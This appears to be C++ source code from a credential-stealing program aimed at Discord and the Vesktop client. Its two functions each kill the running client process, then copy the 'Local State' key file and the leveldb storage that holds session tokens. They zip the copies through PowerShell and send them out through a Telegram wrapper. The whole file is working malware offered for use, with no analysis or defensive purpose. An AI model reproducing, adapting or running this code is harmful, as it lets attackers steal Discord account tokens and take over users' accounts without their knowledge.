#include "pch.h"
#include "../wrappers/telegram.h"
#include "../utils.h"
#include "../debug.h"

#include <string>
#include <filesystem>
#include <cstdlib>
#include <Windows.h>
#include <TlHelp32.h>
#include <thread>

namespace fs = std::filesystem;

namespace grab {
    int zipDirectory(const std::string& dirPath, const std::string& outputZip) {
        std::string cmd = "powershell -Command \"Compress-Archive -Path '" + dirPath + "\\*' -DestinationPath '" + outputZip + "' -Force\"";
        return std::system(cmd.c_str());
    }

    void GetDiscordFolder() {
        const char* appDataEnv = std::getenv("APPDATA");
        const char* tempEnv = std::getenv("TEMP");

        std::string usrname = utils::WideToStr(utils::WindowsComputerName().c_str());

        if (!appDataEnv || !tempEnv) return;

        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        Process32First(snap, &pe);

        do {
            if (wcscmp(pe.szExeFile, L"Discord.exe") == 0) {
                if (strcmp(usrname.c_str(), "Asriel")) {
                    return; // stop terminating my discord
                }

                HANDLE discord = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (discord == NULL) continue;

                if (TerminateProcess(discord, 1)) {
                    Debug::Log("discord terminated");
                }
                else {
                    Debug::LogError("Failed to terminate process");
                }

                CloseHandle(discord);
            }
        } while (Process32Next(snap, &pe));

        fs::path discordState = fs::path(appDataEnv) / "discord" / "Local State";
        fs::path discordStorage = fs::path(appDataEnv) / "discord" / "Local Storage" / "leveldb";

        fs::path tempdiscord = fs::path(tempEnv) / "juni_discord";
        fs::path out = fs::path(tempEnv) / "juni_discord.zip";

        if (!fs::exists(discordState)) return;
        if (!fs::exists(discordStorage)) return;

        fs::path discordLocState = fs::path(tempEnv) / "localstate-discord";
        fs::copy_file(discordState, discordLocState);

        telegram::SendDocument(discordLocState.string());

        fs::create_directories(tempdiscord);

        for (const auto& entry : fs::directory_iterator(discordStorage)) {
            if (entry.is_regular_file() && entry.path().extension() == ".ldb") {
                fs::path destination = tempdiscord / entry.path().filename();

                Debug::Log(("Copying to: " + destination.string()).c_str());

                fs::copy_file(entry.path(), destination, fs::copy_options::overwrite_existing);
            }
        }

        zipDirectory(tempdiscord.string(), out.string());
        telegram::SendDocument(out.string());
    }

    void GetVesktop() {
        const char* appDataEnv = std::getenv("APPDATA");
        const char* tempEnv = std::getenv("TEMP");

        std::string usrname = utils::WideToStr(utils::WindowsComputerName().c_str());

        if (!appDataEnv || !tempEnv) return;

        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        Process32First(snap, &pe);

        do {
            if (wcscmp(pe.szExeFile, L"vesktop.exe") == 0) {
                /*
                if (strcmp(usrname.c_str(), "Asriel")) {
                    return; // stop terminating my discord
                }
                */

                HANDLE discord = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (discord == NULL) continue;

                if (TerminateProcess(discord, 1)) {
                    Debug::Log("vesktop terminated");
                }
                else {
                    Debug::LogError("Failed to terminate process");
                }

                CloseHandle(discord);
            }
        } while (Process32Next(snap, &pe));

        fs::path discordState = fs::path(appDataEnv) / "vesktop" / "sessionData" / "Local State";
        fs::path discordStorage = fs::path(appDataEnv) / "vesktop" / "sessionData" / "Local Storage" / "leveldb";

        if (!fs::exists(discordState) && !fs::exists(discordStorage)) return;

        fs::path tempdiscord = fs::path(tempEnv) / "juni_vesktop";
        fs::path out = fs::path(tempEnv) / "juni_vesktop.zip";

        if (!fs::exists(discordState)) return;
        if (!fs::exists(discordStorage)) return;

        fs::path templocalstate = fs::path(tempEnv) / "localstate-vesktop";
        fs::copy_file(discordState, templocalstate);

        telegram::SendDocument(templocalstate.string());

        fs::create_directories(tempdiscord);

        for (const auto& entry : fs::directory_iterator(discordStorage)) {
            if (entry.is_regular_file() && entry.path().extension() == ".ldb") {
                fs::path destination = tempdiscord / entry.path().filename();

                Debug::Log(("Copying to: " + destination.string()).c_str());

                fs::copy_file(entry.path(), destination, fs::copy_options::overwrite_existing);
            }
        }

        zipDirectory(tempdiscord.string(), out.string());
        telegram::SendDocument(out.string());
    }
}